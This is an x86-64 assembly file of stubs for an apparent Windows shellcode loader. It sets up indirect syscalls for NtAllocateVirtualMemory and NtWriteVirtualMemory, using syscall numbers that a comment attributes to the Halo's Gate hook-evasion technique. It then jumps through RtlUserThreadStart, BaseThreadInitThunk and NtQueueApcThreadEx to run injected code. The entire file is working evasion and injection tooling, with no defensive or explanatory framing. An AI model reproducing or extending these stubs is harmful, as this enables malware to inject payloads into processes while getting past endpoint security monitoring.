extern SSNAllocateVirtualMemory
extern SSNWriteVirtualMemory
extern SSNCreateThreadEx
extern SSNWaitForSingleObject

section .text
    
global AllocateMemory

AllocateMemory:
    mov rbx, rdx                ; prepare rdx for sys call
    mov rcx, [rbx + 0x8]        ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x10]       ; PVOID *BaseAddress
    xor r8, r8                  ; ULONG_PTR ZeroBits
    mov r9, [rbx + 0x18]        ; PSIZE_T RegionSize
    mov r10, [rbx + 0x20]       ; ULONG Protect
    mov [rsp+0x30], r10         ; stack pointer for 6th arg
    mov r10, 0x3000             ; ULONG AllocationType
    mov [rsp+0x28], r10         ; stack pointer for 5th arg
    xor r10, r10
    mov r10, [rbx]              ; NtAllocateVirtualMemory syscall moved to r10
    push r10                    ; push r10 on top of the stack
    mov r10, rcx
    mov eax, dword [rel SSNAllocateVirtualMemory]                ; should be retrieved by Halo's gate based on arch. 
    ret                         ; equivalent to jmp r10


global WriteProcessMemoryCustom

WriteProcessMemoryCustom:
    mov rbx, rdx                ; prepare rdx for sys call
    mov r15, [rbx]              ; NtWriteProcessMemory
    mov rcx, [rbx + 0x8]        ; HANDLE ProcessHandle
    mov rdx, [rbx + 0x10]       ; PVOID BaseAddress
    mov r8, [rbx + 0x18]                 ; PVOID Buffer
    mov r9, [rbx + 0x20]        ; SIZE_T size
    mov r10, [rbx + 0x28]       ; ULONG  NumberOfBytesWritten OPTIONAL
    mov [rsp+0x28], r10         ; pointer for 5th argument
    mov r10, rcx
    mov eax, dword [rel SSNWriteVirtualMemory]
    jmp r15


global RtlUserThreadStartCustom

RtlUserThreadStartCustom:
    mov rbx, rdx                ; prepare rdx for sys call
    mov r15, [rbx]              ; RtlUserThreadStart
    mov rcx, [rbx + 0x8]        ; PTHREAD_START_ROUTINE BaseAddress
    mov rdx, [rbx + 0x10]       ; PVOID Context
    jmp r15

global NtQueueApcThreadCustom

BaseThreadInitThunkCustom:

    mov rbx, rdx                ; prepare rdx for sys call 
    mov r15, [rbx]              ; BaseThreadInitThunk
    mov rcx, [rbx + 0x8]        ; DWORD LdrReserved
    mov rdx, [rbx + 0x10]       ; LPTHREAD_START_ROUTINE lpStartAddress
    mov r8, [rbx + 0x18]        ; LPVOID lpParameter
    jmp r15

global BaseThreadInitThunkCustom

BaseThreadInitXFGThunkCustom:

    mov rbx, rdx                ; prepare rdx for sys call 
    mov r15, [rbx]              ; BaseThreadInitXFGThunk
    mov rcx, [rbx + 0x8]        ; DWORD LdrReserved
    mov rdx, [rbx + 0x10]       ; LPTHREAD_START_ROUTINE lpStartAddress
    mov r9, [rbx + 0x20]
    mov rax, r9
    xor rdx, rdx
    mov r8, [rbx + 0x18]        ; LPVOID lpParameter
    jmp r15

global BaseThreadInitXFGThunkCustom

NtQueueApcThreadCustom:
    mov rbx, rdx                ; prepare rdx for sys call 
    mov r15, [rbx]              ; INT_PTR pNtQueueApcThreadEx
    mov rcx, [rbx + 0x8]        ; HANDLE hThread;  
    mov rdx, [rbx + 0x10]       ; HANDLE UserApcReserveHandle;
    mov r8, [rbx + 0x18]                 ; QUEUE_USER_APC_FLAGS QueueUserApcFlags
    mov r9, [rbx + 0x20]        ; PVOID ApcRoutine
    ;mov r10, [rbx + 0x28]       ; PVOID Memory address of ApcRoutine
    ;mov [rsp+0x28], r10         ; pointer for 5th argument
    ;mov r10, [rbx + 0x30]       ; PVOID The size argument for ApcRoutine
    ;mov [rsp+0x30], r10         ; pointer for 6th argument
    ;mov r10, [rbx + 0x38]       ; PVOID The buffer bytes
    ;mov [rsp+0x38], r10         ; pointer for 7th argument
    jmp r15

global NtTestAlertCustom

NtTestAlertCustom:
    mov rbx, rdx                ; prepare rdx for sys call
    mov r15, [rbx]              ; INT_PTR pNtQueueApcThreadEx
    jmp r15